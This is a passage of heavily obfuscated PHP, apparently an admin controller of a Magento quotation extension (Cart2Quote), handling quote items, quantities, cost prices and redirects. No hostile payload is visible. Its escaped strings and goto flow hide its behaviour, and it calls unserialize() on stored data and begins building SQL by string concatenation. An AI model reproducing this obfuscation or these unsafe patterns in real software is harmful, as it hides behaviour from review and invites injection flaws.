"\163\150\151\x70\160\151\156\147\137\x76\x61\x74\137\x69\x73\137\x76\x61\154\x69\x64" => $DfAxy->getData("\166\x61\164\x5f\x69\163\x5f\x76\141\x6c\151\x64"), "\x73\x68\151\160\x70\151\x6e\147\x5f\x76\141\164\137\x72\x65\x71\165\145\x73\x74\x5f\151\144" => $DfAxy->getData("\x76\x61\164\x5f\x72\145\x71\165\145\x73\x74\x5f\x69\144"), "\x73\150\151\x70\160\151\x6e\x67\x5f\166\141\164\x5f\x72\145\x71\x75\145\163\164\x5f\x64\141\x74\141" => $DfAxy->getData("\166\141\164\137\x72\145\161\165\x65\163\164\137\144\x61\x74\x61"), "\163\x68\151\160\x70\x69\x6e\x67\137\166\141\164\137\162\x65\161\165\145\x73\x74\137\x73\165\x63\x63\145\163\x73" => $DfAxy->getData("\x76\x61\x74\x5f\x72\x65\x71\x75\x65\163\164\x5f\163\165\143\x63\145\163\x73"), "\163\x68\x69\160\160\151\x6e\x67\x5f\x63\x75\163\x74\157\155\x65\x72\137\141\144\144\x72\145\x73\x73\137\151\x64" => $PKkmf, "\x63\x72\145\141\x74\145\x64\137\146\x72\157\x6d\x5f\x71\165\157\x74\x65\137\151\x64" => $SJjwU, "\143\x75\x73\x74\x6f\155\145\162\137\147\x72\157\165\x70\137\151\x64" => $McJRc, "\163\150\151\160\160\151\x6e\147\x5f\x63\x75\163\x74\157\155\x65\162\x5f\147\x72\x6f\165\x70\137\151\144" => $McJRc, "\x63\x75\163\164\x6f\155\x65\162\137\164\x61\170\137\x63\x6c\x61\x73\x73\x5f\151\x64" => $FLYS9]; goto tB1a5; akWro: Mage::getSingleton("\141\x64\x6d\151\x6e\x68\164\155\154\57\163\x65\x73\163\x69\157\x6e")->setConfParent(); goto j4F2O; jvFVF: if (!$oGSWo) { goto f1W50; } goto oPBY7; lNv3i: $Qgehk = ''; goto wZ0Cx; yuAuw: if (empty($EY6wb)) { goto ntFKo; } goto whCPB; L456R: if ($OLseV->getData("\x63\165\x73\164\x6f\x6d\145\162\137\x65\x6d\141\x69\154") != $OLseV->getCustomer()->getEmail()) { goto fUdbm; } goto MMIIo; oPBY7: $dEZQC = $oGSWo->getWebsiteId(); goto gMyca; ZpHWp: $McJRc = $xOx3u["\x6f\162\x64\x65\162"]["\x61\143\x63\x6f\x75\x6e\x74"]["\147\x72\157\165\160\x5f\151\144"]; goto HjKu7; RbZSW: $Yai3_ = Mage::getModel("\161\161\x75\x6f\164\145\141\144\x76\57\x71\x71\141\x64\x76\x63\x75\x73\164\x6f\155\145\162"); goto aQbTR; Rb0Oh: $qLNg0 = $OLseV->getBillingAddress(); goto TF8qe; LCsVI: $r9mMO = Mage::helper("\x71\161\165\x6f\x74\145\x61\144\166"); goto nklnM; whCPB: if (!(!Mage::getStoreConfig("\x63\x75\x73\164\157\155\145\162\57\141\143\143\157\x75\156\x74\x5f\163\150\141\162\145\57\x73\143\157\x70\x65", $OLseV->getStoreId()) == 0)) { goto VFdp6; } goto a4U3u; c1Yt_: foreach ($dbQ0c as $i1eZt => $bxgBR) { $BhWOR[$i1eZt] = $DfAxy->getData($bxgBR); OKg2e: } goto RXdb7; qn_uL: $this->_saveCustomerAfterQuote($OLseV); goto Kvqiz; hZbnW: foreach ($Qg6y7 as $i1eZt => $bxgBR) { $BhWOR[$i1eZt] = $mdGp7[$bxgBR]; NM92p: } goto XG4Un; LCH00: $this->_redirect("\x2a\57\52"); goto Djf_x; eG6n8: ki7pn: goto x9h2R; EWvzP: if (count($naxnU)) { goto ki7pn; } goto Z5V6_; KbYQg: if ($cvDox == 985/985 && $wL2m8 == "\x30") { goto wCT3y; } goto Wuu4n; uEgyg: $HYkyg[] = $this->__("\x4d\157\144\x75\154\x65\40\117\x70\150\151\x72\x61\x68\137\121\x71\x75\157\x74\145\141\x64\166\40\57\x20\x43\141\162\164\x32\121\x75\x6f\164\x65\40\x69\x73\x20\x64\151\163\x61\142\x6c\x65\144\54\40\x70\x6c\x65\x61\x73\145\40\145\x6e\x61\x62\x6c\145\40\151\x74\x20\x69\156\40\x53\171\163\164\145\155\76\103\157\156\146\151\147\165\162\141\x74\x69\157\x6e\x3e\x43\141\162\x74\62\x51\x75\157\x74\145\x3e\x47\145\156\145\x72\141\x6c"); goto WQoqC; GFH2L: $XPUx1 = $DfAxy->getShippingRatesCollection(); goto taXW2; wdVgl: } public function getCustomerSession() { return Mage::getSingleton("\143\165\x73\x74\x6f\155\x65\162\x2f\163\x65\x73\163\x69\157\x6e"); } private function xUwkg($BhWOR, $r8x28) { goto UZ5Bv; H0k33: d0_B3: goto dDJwB; W55dh: $mdGp7 = isset($BhWOR["\x62\141\163\x65\x5f\161\165\157\x74\x65\x5f\162\141\164\x65"]) ? $BhWOR["\x62\x61\x73\x65\x5f\161\165\157\164\145\x5f\162\x61\x74\145"] : 239/239; goto pfYmj; pfYmj: $ZkDTt = $BhWOR["\143\x75\163\164\x6f\x6d\x5f\160\x72\x69\x63\145"] / $mdGp7; goto NHt8J; dDJwB: B7aNJ: goto ODjAi; g2Qzk: $BugRq = serialize($UMVVR["\157\160\164\x69\157\156\163"]); goto lWZWe; s5Fco: return $bymq2; goto AvOGl; G8cNw: try { goto usDPb; WG93o: Mage::dispatchEvent("\157\160\150\151\162\141\x68\x5f\161\x71\x75\157\x74\145\141\x64\x76\137\x61\144\155\151\156\137\163\167\x69\164\x68\62\x51\165\157\x74\x65\x5f\141\144\x64\137\x72\x65\x71\165\145\163\x74\x44\x61\164\x61\x5f\x73\141\166\145\137\142\145\146\x6f\162\x65", ["\x71\x75\157\164\145\x5f\151\164\x65\155" => $uWE5z, "\161\x71\x61\144\166\x63\165\163\x74\157\155\x65\x72\x5f\151\144" => $XELOl]); goto gHxad; B2KCs: Mage::dispatchEvent("\x6f\x70\150\x69\162\141\150\137\x71\x71\165\x6f\x74\145\x61\144\x76\x5f\x61\x64\x6d\x69\156\137\163\167\151\x74\150\62\x51\x75\157\x74\x65\x5f\x61\144\x64\x5f\162\145\x71\165\145\x73\x74\104\141\x74\141\137\163\x61\x76\145\x5f\x61\146\x74\145\x72\x5f\163\x75\143\x63\x65\x73\163", ["\x71\x75\157\x74\145\x5f\151\164\145\x6d" => $uWE5z, "\161\x71\141\144\166\143\x75\163\164\157\x6d\x65\162\x5f\151\144" => $XELOl]); goto lYRJV; usDPb: $WEthx = ["\161\x75\157\x74\145\x5f\151\144" => $this->getCustomerSession()->getQuoteadvId(), "\x70\x72\x6f\144\x75\x63\x74\137\151\144" => $BhWOR["\160\162\x6f\144\x75\143\x74\x5f\x69\144"], "\162\x65\161\165\145\x73\164\x5f\x71\x74\171" => $BhWOR["\161\164\x79"], "\x6f\x77\156\x65\162\x5f\142\x61\x73\145\137\x70\x72\x69\143\x65" => $ZkDTt, "\157\x77\156\145\x72\137\x63\x75\162\137\160\162\151\143\x65" => $IZwBM, "\x6f\x72\151\147\151\x6e\141\x6c\x5f\x70\x72\x69\x63\145" => $oVsTX, "\157\x72\x69\x67\x69\156\x61\154\137\x63\x75\x72\137\160\162\151\143\x65" => $prfoz, "\161\165\x6f\x74\145\141\x64\x76\137\x70\162\x6f\x64\x75\143\164\137\x69\x64" => $bymq2->getId()]; goto WG93o; gHxad: Mage::getModel("\x71\161\165\x6f\164\x65\141\x64\166\x2f\162\x65\161\x75\145\163\x74\151\x74\145\155")->setData($WEthx)->save(); goto B2KCs; lYRJV: } catch (Exception $Zf0h2) { Mage::log("\105\170\143\145\160\x74\x69\157\156\x3a\40" . $Zf0h2->getMessage(), null, "\143\62\161\x5f\x65\x78\143\x65\x70\164\151\157\156\x2e\154\157\147", true); Mage::dispatchEvent("\x6f\x70\x68\x69\x72\x61\x68\x5f\161\x71\165\157\x74\145\141\x64\166\137\141\144\x6d\x69\156\x5f\163\x77\151\164\x68\x32\x51\x75\157\x74\145\137\141\x64\x64\137\162\x65\x71\x75\145\163\x74\x44\x61\164\x61\137\x73\x61\x76\x65\137\141\146\164\x65\x72\137\146\x61\x69\x6c", ["\161\x75\x6f\164\145\x5f\x69\x74\x65\155" => $uWE5z, "\161\x71\141\144\166\143\x75\x73\x74\157\x6d\x65\162\137\151\x64" => $XELOl]); } goto s5Fco; jBTqy: pzXnG: goto KfaK8; EZ9F0: UuOO5: goto rSQwQ; ZJt3C: $prfoz = $oVsTX * $mdGp7; goto fIz16; YucZV: $P222x = 0; goto IDZe2; lWZWe: $P222x = 156/156; goto sf3VG; IDZe2: $BugRq = ''; goto fl1wI; zkyNO: $oVsTX = $BhWOR["\157\162\151\147\151\156\141\154\137\x70\162\151\x63\x65"]; goto ZJt3C; VhpsI: goto B7aNJ; goto EZ9F0; ODjAi: $XELOl = $this->getCustomerSession()->getQuoteadvId(); goto uhGyc; AvOGl: EN_sp: goto Sw1lA; KfaK8: $UMVVR = unserialize($r8x28); goto dvblP; dvblP: if (!isset($UMVVR["\x6f\x70\x74\151\157\156\x73"])) { goto d0_B3; } goto g2Qzk; WN8vz: if (isset($bymq2) && $bymq2 instanceof Ophirah_Qquoteadv_Model_Qqadvproduct && $bymq2->getId()) { goto yzDVy; } goto O8k9u; sf3VG: $BhWOR["\161\164\171"] = $UMVVR["\161\x74\x79"]; goto H0k33; UZ5Bv: $vKage = Mage::getModel("\161\x71\165\157\164\x65\x61\x64\x76\57\161\x71\x61\144\x76\x70\x72\157\x64\x75\143\164"); goto YucZV; O8k9u: return false; goto wLwW5; x40hN: $P222x = 306/306; goto LsTz1; NHt8J: $IZwBM = $BhWOR["\x63\165\163\164\x6f\155\137\160\162\151\x63\x65"]; goto zkyNO; rSQwQ: $BugRq = serialize($BhWOR["\x6f\x70\x74\151\157\x6e\x73"]); goto x40hN; fl1wI: if (isset($BhWOR["\x6f\x70\x74\x69\157\156\x73"])) { goto UuOO5; } goto eV47B; uhGyc: $dvq8X = ["\161\x75\157\x74\x65\x5f\151\x64" => $XELOl, "\160\162\x6f\x64\165\x63\164\137\151\144" => $BhWOR["\x70\162\x6f\144\165\143\x74\x5f\x69\x64"], "\161\x74\171" => $BhWOR["\x71\164\x79"], "\x61\164\164\x72\151\x62\165\x74\x65" => $r8x28, "\150\141\x73\137\x6f\x70\x74\x69\x6f\156\x73" => $P222x, "\157\x70\164\151\x6f\156\163" => $BugRq, "\x75\163\x65\137\144\x69\x73\x63\157\x75\156\164" => $BhWOR["\165\x73\x65\137\x64\151\163\x63\x6f\165\156\164"], "\163\x74\x6f\162\145\137\151\144" => Mage::getSingleton("\141\x64\155\x69\x6e\150\164\x6d\x6c\57\163\x65\x73\163\151\157\x6e\137\161\165\157\164\x65")->getStoreId()]; goto W55dh; yzVMy: try { goto Jo9p6; Jo9p6: Mage::dispatchEvent("\x6f\160\150\x69\162\141\x68\x5f\161\161\165\157\x74\145\x61\x64\x76\137\141\144\x6d\x69\x6e\x5f\163\x77\151\164\150\x32\x51\165\157\164\x65\137\x61\x64\144\137\x71\161\141\x64\x76\x70\162\x6f\144\x75\x63\x74\137\x73\141\166\x65\137\x62\x65\x66\x6f\162\x65", ["\x71\x75\x6f\164\x65\x5f\x69\164\145\155" => $uWE5z, "\x71\x71\141\x64\x76\143\165\163\164\x6f\x6d\x65\x72\137\151\144" => $XELOl]); goto rq7ca; ZiTmn: Mage::dispatchEvent("\x6f\160\150\151\162\x61\x68\x5f\161\161\165\157\x74\145\x61\x64\166\x5f\x61\x64\155\x69\x6e\137\x73\x77\151\x74\150\x32\x51\165\x6f\164\145\137\x61\144\144\x5f\161\x71\141\x64\166\x70\162\157\144\165\143\x74\x5f\163\x61\x76\145\x5f\141\x66\x74\x65\x72\x5f\163\x75\x63\143\145\x73\x73", ["\161\x75\157\x74\x65\x5f\x69\164\x65\155" => $uWE5z, "\x71\x71\x61\x64\x76\x63\x75\x73\164\157\155\145\x72\x5f\151\144" => $XELOl, "\161\x71\x61\x64\x76\x70\x72\x6f\144\165\143\164" => $bymq2]); goto eANPz; rq7ca: $bymq2 = $vKage->addProduct($dvq8X); goto ZiTmn; eANPz: } catch (Exception $Zf0h2) { Mage::log("\105\x78\x63\145\x70\164\151\157\156\72\40" . $Zf0h2->getMessage(), null, "\143\62\x71\137\145\170\x63\x65\160\164\151\157\x6e\x2e\x6c\x6f\x67", true); Mage::dispatchEvent("\x6f\160\x68\151\162\141\x68\137\161\x71\165\157\x74\145\141\144\x76\x5f\141\144\155\x69\156\x5f\163\x77\151\164\150\x32\x51\165\157\x74\x65\137\141\144\x64\x5f\x71\161\141\x64\x76\x70\162\157\x64\x75\x63\x74\137\163\x61\x76\x65\137\x61\146\164\145\x72\137\x66\x61\x69\154", ["\161\165\157\164\145\x5f\151\164\145\155" => $uWE5z, "\161\x71\141\144\166\x63\165\163\164\x6f\x6d\145\162\x5f\151\x64" => $XELOl, "\x65\x78\x63\x65\160\x74\x69\157\156" => $Zf0h2]); } goto WN8vz; wLwW5: goto EN_sp; goto AwwlX; LsTz1: goto B7aNJ; goto jBTqy; fIz16: $uWE5z = Mage::getModel("\x63\141\x74\x61\x6c\157\x67\57\160\162\x6f\x64\x75\143\164")->load($BhWOR["\x70\x72\x6f\x64\x75\x63\x74\x5f\151\x64"]); goto yzVMy; eV47B: if (isset($r8x28)) { goto pzXnG; } goto VhpsI; AwwlX: yzDVy: goto G8cNw; Sw1lA: } public function getCoreSession() { return Mage::getSingleton("\143\157\x72\x65\x2f\x73\x65\x73\x73\151\157\x6e"); } public function deleteQtyFieldAction() { goto gF_Wn; Ljh1y: QILqu: goto vo7s5; PJw0b: $NtGYc = Mage::getModel("\161\161\165\x6f\164\145\141\144\x76\57\x72\x65\x71\165\145\163\164\x69\x74\x65\x6d")->getCollection()->setQuote($g6Kqk); goto AT0uQ; wQxqQ: if ($MOKdF > 537/537) { goto isRzu; } goto l0sTA; wi4vH: Mage::getSingleton("\x61\144\x6d\151\156\x68\164\155\154\x2f\x73\145\163\x73\x69\x6f\x6e")->addError($CFVXR); goto QeKSh; BxYS2: H8i0G: goto fRh6N; fwwlB: Mage::dispatchEvent("\157\160\150\x69\162\141\150\x5f\x71\161\x75\x6f\x74\145\141\144\166\137\141\144\x6d\151\x6e\137\144\145\x6c\x65\x74\145\x51\164\x79\106\x69\145\154\x64\137\x62\145\146\x6f\162\x65", [$ItyfJ, $MYXly]); goto Cc045; gF_Wn: $ItyfJ = (int) $this->getRequest()->getParam("\x72\x65\161\x75\x65\x73\x74\x5f\x69\144"); goto XM1uT; Cc045: $g6Kqk = Mage::getSingleton("\161\161\165\x6f\164\x65\141\144\166\57\161\x71\x61\144\x76\143\x75\163\164\157\x6d\145\162")->load($MYXly); goto ug7AR; R6SNa: $MOKdF = $NtGYc->getSize(); goto wQxqQ; vo7s5: $this->_redirect("\52\x2f\x2a\57\x65\x64\151\164", ["\x69\144" => $MYXly]); goto KvB8A; AT0uQ: $NtGYc->addFieldToFilter("\161\165\157\x74\x65\x61\144\166\137\x70\x72\157\x64\165\x63\x74\x5f\151\144", $dn5f0); goto R6SNa; aVJUa: isRzu: goto m6myz; ug7AR: $dn5f0 = $QbRw5->getData("\x71\165\x6f\x74\145\141\x64\x76\137\160\162\x6f\x64\165\143\164\137\151\x64"); goto PJw0b; KvB8A: Mage::dispatchEvent("\157\160\x68\x69\x72\141\150\x5f\x71\x71\x75\x6f\x74\x65\141\x64\x76\x5f\x61\144\155\151\156\137\144\145\154\x65\164\x65\x51\x74\x79\x46\x69\x65\154\144\x5f\141\146\164\145\162", [$ItyfJ, $MYXly]); goto roYco; fRh6N: $QbRw5 = Mage::getModel("\x71\x71\x75\x6f\164\145\x61\144\166\x2f\x72\145\x71\x75\145\x73\x74\151\x74\145\x6d")->load($ItyfJ); goto lb5aL; m6myz: try { $QbRw5->delete(); } catch (Exception $Zf0h2) { Mage::getSingleton("\141\x64\x6d\151\156\x68\x74\155\154\57\x73\x65\163\x73\x69\157\156")->addError($Zf0h2->getMessage()); Mage::log("\x45\x78\143\145\160\164\151\157\x6e\72\x20" . $Zf0h2->getMessage(), null, "\x63\x32\161\137\145\x78\143\x65\160\164\x69\157\x6e\56\x6c\x6f\147", true); } goto Ljh1y; l0sTA: $CFVXR = $this->__("\115\x69\x6e\151\x6d\165\x6d\x20\157\x66\40\x6f\156\145\x20\x51\x74\171\40\151\163\40\162\x65\161\165\x69\x72\145\x64"); goto wi4vH; XM1uT: $MYXly = null; goto i4Dgu; i4Dgu: if (!empty($ItyfJ)) { goto H8i0G; } goto Ctvz5; Ctvz5: $this->_redirect("\52\57\x2a\57\x2a"); goto BxYS2; lb5aL: $MYXly = $QbRw5->getData("\x71\x75\157\x74\x65\137\x69\x64"); goto fwwlB; QeKSh: goto QILqu; goto aVJUa; roYco: } public function addQtyFieldAction() { goto WOqbb; xC52W: $ZkDTt = Mage::helper("\161\x71\x75\x6f\x74\145\141\x64\x76")->_applyPrice($dn5f0, $IMLJX, false, true); goto AFRNk; hfqPI: $mdGp7 = $FsnNf->getBase2QuoteRate(); goto xC52W; GoYsd: $this->_redirectErr($hewCg); goto hC4Hd; AMErc: $WEthx = ["\x71\x75\x6f\x74\x65\137\151\144" => $MYXly, "\160\x72\x6f\x64\x75\143\x74\137\x69\144" => $sRb87, "\x72\145\161\x75\x65\163\x74\137\161\x74\x79" => $IMLJX, "\157\x77\x6e\x65\162\137\142\x61\x73\x65\x5f\160\162\151\x63\145" => $ZkDTt, "\157\x77\156\145\x72\137\x63\165\162\137\x70\x72\x69\x63\145" => $clu71 * $mdGp7, "\x6f\x72\151\147\151\156\x61\154\137\160\162\x69\143\145" => $HNaQR, "\161\x75\157\164\x65\141\x64\x76\137\x70\x72\x6f\144\x75\x63\164\x5f\151\x64" => $dn5f0, "\157\x72\151\147\151\156\x61\x6c\137\143\165\x72\x5f\x70\162\x69\143\x65" => $ZkDTt * $mdGp7]; goto aaazG; qMX6N: if (!is_array($IMLJX)) { goto CcQ3c; } goto QdKjm; WOqbb: $dn5f0 = (int) $this->getRequest()->getParam("\x71\x75\157\x74\145\x5f\160\162\157\144\x75\143\164\x5f\x69\x64"); goto rgOsF; Ibdrc: SWvKh: goto gFzpD; d7mxB: FwrCP: goto KRgqR; oNgm0: $HNaQR = Mage::helper("\161\161\x75\x6f\x74\145\141\x64\166")->_applyPrice($dn5f0, 401/401, false, true); goto UF0Si; toqxC: R2wuw: goto Ibdrc; aaazG: if (!$IMLJX) { goto cPNWy; } goto FJyf8; x0wHs: x7ub4: goto yxpO_; qD0Lc: Mage::dispatchEvent("\157\160\x68\151\162\141\150\x5f\x71\161\165\157\x74\145\141\x64\x76\x5f\x61\144\x6d\151\x6e\137\141\x64\144\121\x74\171\x46\151\x65\x6c\144\137\x62\x65\146\x6f\x72\145", [$dn5f0]); goto PVU_e; h9RWv: uybdG: goto YMdbb; KRgqR: return $this->_redirect("\52\x2f\x2a\x2f\145\x64\x69\x74", ["\x69\x64" => $MYXly]); goto toqxC; UF0Si: $FsnNf = $this->getQuotationQuote($MYXly); goto hfqPI; A1Z2m: Mage::getSingleton("\141\x64\x6d\x69\x6e\150\x74\x6d\154\57\x73\x65\163\x73\x69\x6f\156")->addError($HYkyg); goto GG2z9; jp4Oh: $ONoXp = unserialize($ONoXp); goto pfhFA; Frohl: EzO2i: goto LEyT2; EOW6w: $this->_redirect("\52\57\52\57"); goto mBOP9; Ni1IY: foreach ($rTBV2 as $QbRw5) { goto F5UM7; XFhrD: if (!$zjhFp->getHasErrors()) { goto lvcR6; } goto AaOZ_; vb8gZ: lvcR6: goto HsPc8; DZWLz: sj1x3: goto BqKPi; H2KES: $sRb87 = $QbRw5->getData("\160\x72\157\x64\x75\143\164\137\x69\144"); goto en0BK; AaOZ_: $hewCg = $zjhFp->getErrors(); goto j8PCY; iGWzZ: return $this->_redirect("\52\57\x2a\x2f\x65\x64\x69\x74", ["\151\144" => $MYXly]); goto rB5cy; fAqBL: return null; goto vb8gZ; HsPc8: if (!($IMLJX == $QbRw5->getData("\x72\145\161\x75\145\x73\164\137\161\164\x79"))) { goto vWpmP; } goto WV8M5; jDLo4: Mage::getSingleton("\141\x64\x6d\151\x6e\150\164\155\x6c\57\x73\x65\x73\163\x69\x6f\x6e")->addError($HYkyg); goto iGWzZ; F5UM7: $MYXly = $QbRw5->getData("\161\x75\157\x74\x65\x5f\x69\144"); goto H2KES; rB5cy: vWpmP: goto DZWLz; j8PCY: $this->_redirectErr($hewCg); goto fAqBL; WV8M5: $HYkyg = $this->__("\104\165\x70\x6c\151\143\x61\164\x65\40\x76\141\x6c\x75\x65\x20\x65\156\x74\145\x72\145\144"); goto jDLo4; en0BK: $zjhFp = Mage::helper("\x71\x71\165\157\x74\x65\x61\144\x76")->isQuoteable($sRb87, $IMLJX); goto XFhrD; BqKPi: } goto TuqG0; bhZ3o: return null; goto JhOYW; ketX7: $IMLJX = $this->getRequest()->getParam("\162\145\161\165\145\163\164\x5f\x71\164\x79"); goto ZWEfd; K0c5M: $clu71 = Mage::helper("\161\161\165\x6f\x74\145\141\144\166")->_applyPrice($dn5f0, $IMLJX, false, false); goto oNgm0; aoKr7: goto R2wuw; goto d7mxB; FJyf8: try { Mage::getModel("\x71\161\x75\x6f\164\145\x61\x64\166\57\162\145\161\165\x65\x73\164\151\x74\145\155")->setData($WEthx)->save(); } catch (Exception $Zf0h2) { Mage::getSingleton("\141\x64\155\151\156\x68\x74\x6d\154\x2f\163\145\163\163\x69\157\x6e")->addError($Zf0h2->getMessage()); Mage::log("\105\x78\x63\x65\160\x74\151\157\156\72\x20" . $Zf0h2->getMessage(), null, "\143\x32\161\x5f\145\170\x63\145\x70\x74\x69\x6f\x6e\x2e\154\x6f\x67", true); } goto svmHP; yxpO_: $sRb87 = null; goto u8w3n; AFRNk: if (!($MYXly && $sRb87 && isset($HNaQR) && $IMLJX)) { goto Oz1Ab; } goto AMErc; wGldx: Mage::dispatchEvent("\157\160\150\x69\162\141\x68\x5f\x71\x71\x75\x6f\x74\145\141\144\166\x5f\141\x64\155\x69\x6e\x5f\x61\144\x64\121\164\x79\106\151\x65\154\x64\x5f\141\146\x74\145\x72", [$dn5f0]); goto bhZ3o; GG2z9: if (!empty($MYXly)) { goto FwrCP; } goto qFPtX; yi9m5: if (!empty($MYXly)) { goto OWhPq; } goto EOW6w; mBOP9: goto YajIs; goto ZjTZa; iE1ro: dsXOE: goto ketX7; gFzpD: $g6Kqk = Mage::getSingleton("\161\161\165\x6f\164\x65\x61\x64\x76\57\161\161\141\x64\166\143\165\x73\x74\157\155\145\x72")->load($MYXly); goto hxsOZ; pfhFA: KRBgO: goto ccaI6; TuqG0: Ol0od: goto K0c5M; YMdbb: $ONoXp = $kw2RS->getAttribute(); goto LXptm; TrLFq: $c3RCn = Mage::getModel("\143\x61\x74\141\154\157\x67\57\x70\162\x6f\144\x75\x63\164")->load($kw2RS->getData("\x70\162\157\144\165\x63\164\137\x69\x64")); goto qD0Lc; LC9YH: $UmxIK = $c3RCn; goto ijiDU; LEyT2: CcQ3c: goto ouLd4; rgOsF: $kw2RS = Mage::getModel("\x71\161\165\157\x74\145\141\x64\x76\57\x71\161\x61\x64\166\x70\x72\x6f\144\x75\143\x74")->load($this->getRequest()->getParam("\x71\165\x6f\x74\145\137\x70\162\x6f\144\x75\x63\x74\137\x69\x64")); goto TrLFq; DskXW: Oz1Ab: goto yi9m5; MxFji: YajIs: goto wGldx; ZWEfd: $MYXly = $this->getRequest()->getParam("\x71\x75\x6f\164\x65\141\144\166\x5f\x69\144"); goto qMX6N; ccaI6: $sbkjI = Mage::getModel("\143\141\x74\x61\x6c\x6f\x67\57\160\162\x6f\144\165\x63\164\x5f\164\171\x70\145\x5f\x63\x6f\x6e\146\x69\x67\x75\x72\141\x62\154\145")->getProductByAttributes($ONoXp["\x73\x75\x70\x65\x72\137\141\x74\x74\162\x69\x62\165\164\145"], $c3RCn); goto EBmCx; ZjTZa: OWhPq: goto VTY2Y; hC4Hd: return null; goto x0wHs; PVU_e: if ($c3RCn->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_CONFIGURABLE) { goto uybdG; } goto LC9YH; ZM8QD: $hewCg = $zjhFp->getErrors(); goto GoYsd; FYA6_: if (!$zjhFp->getHasErrors()) { goto x7ub4; } goto ZM8QD; V72Di: $HYkyg = Mage::helper("\x63\150\145\x63\x6b\157\165\164")->__("\x49\156\166\141\154\151\144\40\x64\x61\x74\x61\x2e"); goto A1Z2m; LXptm: if (is_array($ONoXp)) { goto KRBgO; } goto jp4Oh; u8w3n: if (!(empty($dn5f0) || empty($IMLJX))) { goto SWvKh; } goto V72Di; VTY2Y: $this->_redirect("\x2a\x2f\52\x2f\x65\144\151\x74", ["\151\144" => $MYXly]); goto MxFji; ijiDU: goto dsXOE; goto h9RWv; svmHP: cPNWy: goto DskXW; QdKjm: foreach ($IMLJX as $pnm92) { goto sRMrB; tL1PH: goto EzO2i; goto QrPih; sRMrB: $IMLJX = $pnm92; goto tL1PH; QrPih: SosPi: goto Lb5dy; Lb5dy: } goto Frohl; ouLd4: $zjhFp = Mage::helper("\161\x71\165\x6f\164\x65\x61\x64\166")->isQuoteable($UmxIK, $IMLJX); goto FYA6_; EBmCx: $UmxIK = $sbkjI; goto iE1ro; hxsOZ: $rTBV2 = Mage::getModel("\161\x71\165\157\x74\145\x61\x64\166\x2f\x72\x65\x71\165\x65\x73\164\x69\164\145\x6d")->getCollection()->setQuote($g6Kqk)->addFieldToFilter("\161\x75\157\x74\145\x61\x64\166\x5f\x70\162\x6f\144\x75\x63\x74\x5f\x69\x64", $dn5f0); goto Ni1IY; qFPtX: return $this->_redirect("\x2a\57\52\57"); goto aoKr7; JhOYW: } public function getAdminName($vuQ04) { return Mage::helper("\x71\x71\165\157\164\x65\x61\x64\166")->getAdminName($vuQ04); } protected function _redirectAnhcor($aU2S8, $krpSh = array(), $ZXeY6 = '') { goto SnxLt; d_HAs: return $this; goto Muun_; s2HR1: $this->getResponse()->setRedirect($this->getUrl($aU2S8, $krpSh) . $ZXeY6); goto d_HAs; SnxLt: $this->_getSession()->setIsUrlNotice($this->getFlag('', self::vBk_Y)); goto s2HR1; Muun_: } public function addCostPriceAction() { goto U8mA1; DU0Qj: gtKO6: goto vW5aq; RDu90: $qgVe0 = str_replace("\x2c", "\56", $qgVe0); goto s6Nfy; xk_UJ: $wAPVw->setCostPrice($qgVe0); goto CZEEl; WbVZA: $qgVe0 = $this->getRequest()->getParam("\x6e\145\167\x5f\x63\x6f\163\164\x5f\x70\x72\151\x63\145"); goto RDu90; TcuRj: $this->_redirect("\x2a\57\x2a\57"); goto c3YYv; N6nAH: UKNYl: goto YlUwb; vW5aq: Mage::dispatchEvent("\x6f\x70\150\151\162\x61\x68\137\x71\x71\165\157\x74\x65\141\144\x76\137\x61\144\x6d\x69\x6e\x5f\x61\x64\x64\x43\157\x73\x74\x50\162\x69\143\145\137\x61\146\x74\x65\162", [$MYXly, $ItyfJ, $qgVe0]); goto MPKVk; c3YYv: goto gtKO6; goto zGt_F; CZEEl: $wAPVw->save(); goto N6nAH; q4tJm: $ItyfJ = $this->getRequest()->getParam("\162\x65\x71\165\145\163\164\x5f\x69\144"); goto WbVZA; d0IdG: $this->_redirect("\52\57\x2a\x2f\x65\x64\151\164", ["\x69\144" => $MYXly]); goto DU0Qj; YlUwb: if (!empty($MYXly)) { goto j12l5; } goto TcuRj; U8mA1: $MYXly = (int) $this->getRequest()->getParam("\161\x75\157\x74\145\141\144\x76\137\x69\144"); goto q4tJm; s6Nfy: Mage::dispatchEvent("\x6f\160\x68\x69\162\141\x68\137\161\161\x75\x6f\164\145\141\144\x76\137\141\144\x6d\151\156\x5f\141\144\x64\103\x6f\x73\164\120\162\x69\x63\x65\x5f\x62\145\146\x6f\x72\x65", [$MYXly, $ItyfJ, $qgVe0]); goto rghk2; rghk2: if (!(isset($ItyfJ) && !empty($ItyfJ) && (isset($MYXly) && !empty($MYXly)))) { goto UKNYl; } goto Bn2As; Bn2As: $wAPVw = Mage::getModel("\x71\161\x75\x6f\164\145\x61\144\x76\57\162\145\161\165\145\x73\164\x69\x74\145\155")->load($ItyfJ); goto xk_UJ; zGt_F: j12l5: goto d0IdG; MPKVk: } protected function _isAllowed() { $H_yKl = "\x73\x61\154\145\x73\x2f\x71\161\x75\157\164\x65\141\144\166"; return Mage::getSingleton("\141\x64\x6d\x69\x6e\x2f\163\x65\x73\163\x69\157\x6e")->isAllowed($H_yKl); } protected function getQuotationQuote($XELOl = null) { goto qXE6K; ZPCxV: jiRsC: goto kvxto; JlqWs: if (!($this->ckgwQ->getId() != $XELOl)) { goto x7XLa; } goto d0iIO; qXE6K: if (!($XELOl == null)) { goto wds8G; } goto XGKbQ; XGKbQ: return $this->ckgwQ; goto i72JM; dPAAD: $this->ckgwQ = Mage::getModel("\161\161\x75\157\164\x65\x61\144\x76\57\161\161\141\144\x76\143\x75\163\x74\157\155\x65\x72")->load($XELOl); goto kc34b; RUEKR: x7XLa: goto ZPCxV; y6ORk: if ($this->ckgwQ) { goto qu21J; } goto dPAAD; W6iDB: qu21J: goto JlqWs; kc34b: goto jiRsC; goto W6iDB; d0iIO: $this->ckgwQ = Mage::getModel("\161\161\165\157\164\145\x61\x64\x76\57\161\161\x61\144\x76\x63\165\163\x74\x6f\x6d\x65\x72")->load($XELOl); goto RUEKR; i72JM: wds8G: goto y6ORk; kvxto: return $this->ckgwQ; goto kHVOR; kHVOR: } public function fixdatabaseAction() { goto z5dv2; coDp9: $RfEiJ = "\125\x50\104\101\124\x45\40" . $v6VEw . "\40\123\105\124\x20\144\x61\x74\x61\137\x76\145\x72\x73\151\157\x6e\x20\75\40\x22" . $T3YJX . 